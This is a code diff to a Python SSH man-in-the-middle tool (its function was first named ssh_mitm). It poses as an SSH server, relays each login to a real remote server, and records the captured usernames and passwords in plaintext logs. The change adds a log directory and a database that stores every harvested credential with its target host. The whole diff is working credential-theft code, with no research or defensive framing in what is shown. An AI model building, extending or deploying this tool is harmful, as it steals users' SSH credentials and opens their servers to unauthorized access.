@@ -14,8 +14,19 @@ from paramiko.py3compat import b, u, decodebytes
 import logging
 from datetime import datetime
 
+from sshcredentialsdb import CredentialsStore
+
 # setup logging
 paramiko.util.log_to_file("sshserver.log")
+
+import os
+path = "logs"
+# Check whether the specified path exists or not
+isExist = os.path.exists(path)
+if not isExist:
+
+   # Create a new directory because it does not exist
+   os.makedirs(path)
 
 host_key = paramiko.RSAKey(filename="id_rsa")
 # host_key = paramiko.DSSKey(filename='test_dss.key')
@@ -27,23 +38,12 @@ class Server(paramiko.ServerInterface):
     # 'data' is the output of base64.b64encode(key)
     # (using the "user_rsa_key" files)
 
-    def __init__(self,remotesshserver):
+    def __init__(self,remotesshserver,db_name):
         self.remotesshserver = remotesshserver
         self.client = paramiko.SSHClient()
         self.client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
         self.event = threading.Event()
-        logger = logging.getLogger(datetime.now().strftime("%d-%m-%Y-%H-%M-%S"))
-        logger.setLevel(level=logging.DEBUG)
-        logFileFormatter = logging.Formatter(
-            fmt=f"%(asctime)s - %(message)s",
-            datefmt="%Y-%m-%d %H:%M:%S",
-        )
-        fileHandler = logging.FileHandler(filename=(datetime.now().strftime("%d-%m-%Y-%H-%M-%S")+".log"))
-        fileHandler.setFormatter(logFileFormatter)
-        fileHandler.setLevel(level=logging.INFO)
-
-        logger.addHandler(fileHandler)
-        self.logger = logger
+        self.db_name = db_name
 
     def check_channel_request(self, kind, chanid):
         if kind == "session":
@@ -54,8 +54,22 @@ class Server(paramiko.ServerInterface):
         try:
             self.client.connect(remotesshserver, username=username,
                                 password=password, port=22)
+            logger = logging.getLogger(datetime.now().strftime("%d-%m-%Y-%H-%M-%S"))
+            logger.setLevel(level=logging.DEBUG)
+            logFileFormatter = logging.Formatter(
+                fmt=f"%(asctime)s - %(message)s",
+                datefmt="%Y-%m-%d %H:%M:%S",
+            )
+            fileHandler = logging.FileHandler(filename=("logs/"+datetime.now().strftime("%d-%m-%Y-%H-%M-%S")+".log"))
+            fileHandler.setFormatter(logFileFormatter)
+            fileHandler.setLevel(level=logging.INFO)
+
+            logger.addHandler(fileHandler)
+            self.logger = logger
             self.logger.critical(f"Authenticated! username = {username} , password = {password}")
             print(f"Authenticated! username = {username} , password = {password}")
+            credentials_store = CredentialsStore(self.db_name)
+            credentials_store.add_credentials(username,password,self.remotesshserver)
             return paramiko.AUTH_SUCCESSFUL
         except Exception as e:
             return paramiko.AUTH_FAILED
@@ -78,7 +92,7 @@ class Server(paramiko.ServerInterface):
     def get_logger(self):
         return self.logger
     
-def handle_ssh_connection(client,server):
+def handle_ssh_connection(client,server,db_name):
     print("Got a connection!")
     try:
         t = paramiko.Transport(client)
@@ -88,7 +102,7 @@ def handle_ssh_connection(client,server):
             print("(Failed to load moduli -- gex will be unsupported.)")
             raise
         t.add_server_key(host_key)
-        server = Server(remotesshserver)
+        server = Server(remotesshserver,db_name)
         try:
             t.start_server(server=server)
         except paramiko.SSHException:
@@ -151,7 +165,7 @@ def handle_ssh_connection(client,server):
         except:
             pass
 
-def ssh_mitm():
+def serve_ssh(db_name):
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -165,7 +179,7 @@ def ssh_mitm():
         try:
             sock.listen(100)
             client, addr = sock.accept()
-            threading.Thread(target = handle_ssh_connection, args = (client,addr)).start()
+            threading.Thread(target = handle_ssh_connection, args = (client,addr,db_name)).start()
         except Exception as e:
             print("*** Listen/accept failed: " + str(e))
             traceback.print_exc()
@@ -176,6 +190,3 @@ def ssh_mitm():
 def set_remote_server_address(address):
     global remotesshserver
     remotesshserver = address
-
-if __name__ == "__main__":
-    ssh_mitm()
